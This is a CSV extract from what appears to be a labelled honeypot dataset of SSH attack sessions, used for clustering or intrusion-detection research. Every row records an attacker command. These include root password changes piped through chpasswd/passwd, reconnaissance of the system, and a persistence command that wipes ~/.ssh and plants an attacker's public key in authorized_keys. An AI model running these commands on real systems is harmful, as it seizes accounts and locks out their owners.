,session,command_freq,input,attack_cat,label_nr,label_desc,duration,SeededKmeans_result,Kmeans_results,PCKmeans_exp_result
17319,1e29336eb7f2,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17320,1e29336eb7f2,15,"echo ""root:D6n7EseRGtLK""|chpasswd|bash",Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17321,1e29336eb7f2,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17322,1e29336eb7f2,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17323,1e29336eb7f2,15,ls -lh $(which ls),Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17324,1e29336eb7f2,15,which ls,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17325,1e29336eb7f2,15,crontab -l,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17326,1e29336eb7f2,15,w,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17327,1e29336eb7f2,15,uname -m,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17328,1e29336eb7f2,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17329,1e29336eb7f2,15,top,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17330,1e29336eb7f2,15,uname,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17331,1e29336eb7f2,15,uname -a,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17332,1e29336eb7f2,15,lscpu | grep Model,Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17333,1e29336eb7f2,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.656152486801147,1,2,3
17334,a1a5f34d14eb,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17335,a1a5f34d14eb,18,"echo -e ""ehkwon\nonuVh7jqU639\nonuVh7jqU639""|passwd|bash",Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17336,a1a5f34d14eb,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17337,a1a5f34d14eb,18,Enter new UNIX password:,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17338,a1a5f34d14eb,18,"echo ""ehkwon\nonuVh7jqU639\nonuVh7jqU639\n""|passwd",Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17339,a1a5f34d14eb,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17340,a1a5f34d14eb,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17341,a1a5f34d14eb,18,ls -lh $(which ls),Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17342,a1a5f34d14eb,18,which ls,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17343,a1a5f34d14eb,18,crontab -l,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17344,a1a5f34d14eb,18,w,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17345,a1a5f34d14eb,18,uname -m,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17346,a1a5f34d14eb,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17347,a1a5f34d14eb,18,top,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17348,a1a5f34d14eb,18,uname,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17349,a1a5f34d14eb,18,uname -a,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17350,a1a5f34d14eb,18,lscpu | grep Model,Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17351,a1a5f34d14eb,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.659626007080078,1,2,3
17352,4c3c046108ce,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17353,4c3c046108ce,18,"echo -e ""weblogicpass\nKblxDNBtYROJ\nKblxDNBtYROJ""|passwd|bash",Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17354,4c3c046108ce,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17355,4c3c046108ce,18,Enter new UNIX password:,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17356,4c3c046108ce,18,"echo ""weblogicpass\nKblxDNBtYROJ\nKblxDNBtYROJ\n""|passwd",Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17357,4c3c046108ce,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17358,4c3c046108ce,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17359,4c3c046108ce,18,ls -lh $(which ls),Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17360,4c3c046108ce,18,which ls,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17361,4c3c046108ce,18,crontab -l,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17362,4c3c046108ce,18,w,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17363,4c3c046108ce,18,uname -m,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17364,4c3c046108ce,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17365,4c3c046108ce,18,top,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17366,4c3c046108ce,18,uname,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17367,4c3c046108ce,18,uname -a,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17368,4c3c046108ce,18,lscpu | grep Model,Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17369,4c3c046108ce,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.670921087265016,1,2,3
17370,d1138154a979,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17371,d1138154a979,15,"echo ""root:h5NxYf8GoCU5""|chpasswd|bash",Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17372,d1138154a979,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17373,d1138154a979,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17374,d1138154a979,15,ls -lh $(which ls),Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17375,d1138154a979,15,which ls,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17376,d1138154a979,15,crontab -l,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17377,d1138154a979,15,w,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17378,d1138154a979,15,uname -m,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17379,d1138154a979,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17380,d1138154a979,15,top,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17381,d1138154a979,15,uname,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17382,d1138154a979,15,uname -a,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17383,d1138154a979,15,lscpu | grep Model,Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17384,d1138154a979,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.693724155426024,1,2,3
17385,1b17f854ff50,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17386,1b17f854ff50,15,"echo ""root:SHw17xVjs8zu""|chpasswd|bash",Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17387,1b17f854ff50,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17388,1b17f854ff50,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17389,1b17f854ff50,15,ls -lh $(which ls),Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17390,1b17f854ff50,15,which ls,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17391,1b17f854ff50,15,crontab -l,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17392,1b17f854ff50,15,w,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17393,1b17f854ff50,15,uname -m,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17394,1b17f854ff50,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17395,1b17f854ff50,15,top,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17396,1b17f854ff50,15,uname,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17397,1b17f854ff50,15,uname -a,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17398,1b17f854ff50,15,lscpu | grep Model,Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17399,1b17f854ff50,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.693864583969116,1,2,3
17400,ff806abca3c5,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17401,ff806abca3c5,15,"echo ""root:pHdvymSpUwz0""|chpasswd|bash",Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17402,ff806abca3c5,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17403,ff806abca3c5,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17404,ff806abca3c5,15,ls -lh $(which ls),Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17405,ff806abca3c5,15,which ls,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17406,ff806abca3c5,15,crontab -l,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17407,ff806abca3c5,15,w,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17408,ff806abca3c5,15,uname -m,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17409,ff806abca3c5,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17410,ff806abca3c5,15,top,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17411,ff806abca3c5,15,uname,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17412,ff806abca3c5,15,uname -a,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17413,ff806abca3c5,15,lscpu | grep Model,Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17414,ff806abca3c5,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.701987028121948,1,2,3
17415,688f2bb0a7b9,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17416,688f2bb0a7b9,18,"echo -e ""flj\np0aJoMlPJ9Fx\np0aJoMlPJ9Fx""|passwd|bash",Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17417,688f2bb0a7b9,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17418,688f2bb0a7b9,18,Enter new UNIX password:,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17419,688f2bb0a7b9,18,"echo ""flj\np0aJoMlPJ9Fx\np0aJoMlPJ9Fx\n""|passwd",Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17420,688f2bb0a7b9,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17421,688f2bb0a7b9,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17422,688f2bb0a7b9,18,ls -lh $(which ls),Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17423,688f2bb0a7b9,18,which ls,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17424,688f2bb0a7b9,18,crontab -l,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17425,688f2bb0a7b9,18,w,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17426,688f2bb0a7b9,18,uname -m,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17427,688f2bb0a7b9,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17428,688f2bb0a7b9,18,top,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17429,688f2bb0a7b9,18,uname,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17430,688f2bb0a7b9,18,uname -a,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17431,688f2bb0a7b9,18,lscpu | grep Model,Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17432,688f2bb0a7b9,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.781444072723389,1,2,3
17433,7b57c339404e,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17434,7b57c339404e,15,"echo ""root:DbajeGekWzRO""|chpasswd|bash",Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17435,7b57c339404e,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17436,7b57c339404e,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17437,7b57c339404e,15,ls -lh $(which ls),Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17438,7b57c339404e,15,which ls,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17439,7b57c339404e,15,crontab -l,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17440,7b57c339404e,15,w,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17441,7b57c339404e,15,uname -m,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17442,7b57c339404e,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17443,7b57c339404e,15,top,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17444,7b57c339404e,15,uname,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17445,7b57c339404e,15,uname -a,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17446,7b57c339404e,15,lscpu | grep Model,Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17447,7b57c339404e,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.783114671707152,1,2,3
17448,7de32b29f62f,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17449,7de32b29f62f,15,"echo ""root:eVSJLnjjB72E""|chpasswd|bash",Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17450,7de32b29f62f,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17451,7de32b29f62f,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17452,7de32b29f62f,15,ls -lh $(which ls),Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17453,7de32b29f62f,15,which ls,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17454,7de32b29f62f,15,crontab -l,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17455,7de32b29f62f,15,w,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17456,7de32b29f62f,15,uname -m,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17457,7de32b29f62f,15,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17458,7de32b29f62f,15,top,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17459,7de32b29f62f,15,uname,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17460,7de32b29f62f,15,uname -a,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17461,7de32b29f62f,15,lscpu | grep Model,Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17462,7de32b29f62f,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.796550750732422,1,2,3
17463,f32a8f29eaec,18,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17464,f32a8f29eaec,18,"echo -e ""1\nvmc2UI5JfAem\nvmc2UI5JfAem""|passwd|bash",Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17465,f32a8f29eaec,18,Enter new UNIX password: ,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17466,f32a8f29eaec,18,Enter new UNIX password:,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17467,f32a8f29eaec,18,"echo ""1\nvmc2UI5JfAem\nvmc2UI5JfAem\n""|passwd",Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17468,f32a8f29eaec,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17469,f32a8f29eaec,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17470,f32a8f29eaec,18,ls -lh $(which ls),Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17471,f32a8f29eaec,18,which ls,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17472,f32a8f29eaec,18,crontab -l,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17473,f32a8f29eaec,18,w,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17474,f32a8f29eaec,18,uname -m,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17475,f32a8f29eaec,18,cat /proc/cpuinfo | grep model | grep name | wc -l,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17476,f32a8f29eaec,18,top,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17477,f32a8f29eaec,18,uname,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17478,f32a8f29eaec,18,uname -a,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17479,f32a8f29eaec,18,lscpu | grep Model,Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17480,f32a8f29eaec,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",Malicious activity,1,SSH attack,14.819445848464966,1,2,3
17481,6e23bafeec60,15,cat /proc/cpuinfo | grep name | wc -l,Malicious activity,1,SSH attack,14.835287809371948,1,2,3
